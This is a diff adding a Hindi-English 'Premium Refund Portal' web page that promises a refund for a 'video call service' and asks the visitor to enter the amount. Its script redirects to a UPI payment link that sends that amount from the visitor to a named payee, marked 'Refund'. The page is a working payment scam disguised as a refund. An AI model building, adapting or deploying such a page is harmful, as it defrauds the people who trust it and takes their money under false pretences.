@@ -1,0 +1,144 @@
+<!DOCTYPE html><html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Refund Page</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }body {
+  font-family: 'Poppins', sans-serif;
+  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+  color: #fff;
+  padding: 40px 20px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  background: rgba(255, 255, 255, 0.05);
+  backdrop-filter: blur(20px);
+  padding: 40px;
+  border-radius: 20px;
+  max-width: 450px;
+  width: 100%;
+  box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+  border: 2px solid rgba(255, 255, 255, 0.2);
+  animation: fadeIn 1s ease-in-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+h2 {
+  font-size: 24px;
+  margin-bottom: 20px;
+  color: #f2f2f2;
+  text-align: center;
+}
+
+.message-box {
+  background: rgba(0, 255, 150, 0.1);
+  padding: 20px;
+  border-left: 5px solid #00ff99;
+  border-radius: 10px;
+  margin-bottom: 30px;
+  animation: fadeIn 1.2s ease-in-out;
+}
+
+.message-box h3 {
+  color: #00ffcc;
+  margin-bottom: 10px;
+}
+
+.message-box p {
+  font-size: 15px;
+  color: #e0f7fa;
+}
+
+label {
+  display: block;
+  margin-bottom: 8px;
+  font-weight: 600;
+}
+
+input[type="number"] {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 8px;
+  margin-bottom: 20px;
+  font-size: 16px;
+  background: rgba(255, 255, 255, 0.1);
+  color: #fff;
+}
+
+input::placeholder {
+  color: #ccc;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  font-size: 18px;
+  background: linear-gradient(to right, #00ff99, #00ccff);
+  color: #000;
+  border: none;
+  border-radius: 10px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+button:hover {
+  background: linear-gradient(to right, #00ccff, #00ff99);
+  transform: scale(1.02);
+}
+
+.footer-note {
+  text-align: center;
+  margin-top: 20px;
+  font-size: 12px;
+  color: #ccc;
+}
+
+  </style>
+</head>
+<body>  <div class="container">
+    <h2>💎 Premium Refund Portal</h2><div class="message-box">
+  <h3>💚 आपकी संतुष्टि हमारे लिए सबसे ज़रूरी है</h3>
+  <p>
+    अगर हमारी <strong>वीडियो कॉल सेवा</strong> आपके मन मुताबिक नहीं रही, तो हमें खेद है।<br>
+    हम पूरे सम्मान के साथ <strong>आपका भुगतान वापस कर रहे हैं</strong>।<br><br>
+    <em>Thank you for trusting us. Your peace of mind matters most.</em>
+  </p>
+</div>
+
+<label for="amount">Refund Amount (₹):</label>
+<input type="number" id="amount" placeholder="राशि दर्ज करें" required>
+
+<button onclick="makeRefund()">🔁 Refund भेजें</button>
+
+<div class="footer-note">
+  आपकी जानकारी और गोपनीयता की हमेख और गोप्ता से कद्र करते हैं।
+</div>
+
+  </div>  <script>
+    function makeRefund() {
+      const amount = document.getElementById('amount').value;
+      if (amount === '' || parseFloat(amount) <= 0) {
+        alert("\u0915\u0943\u092a\u092f\u093e \u092e\u093e\u0928\u094d\u092f \u0930\u093e\u0936\u093f \u0926\u0930\u094d\u091c \u0915\u0930\u0947\u0902");
+        return;
+      }
+      const upiLink = `upi://pay?ver=01&mode=19&pa=pintukumarmeena992239.rzp@icici&pn=PINTUKUMARMEENA&tr=RZPQiCzaSEAngUDBCqrv2&cu=INR&mc=7941&qrMedium=04&tn=Refund&am=${amount}`;
+      window.location.href = upiLink;
+    }
+  </script></body>
+</html>
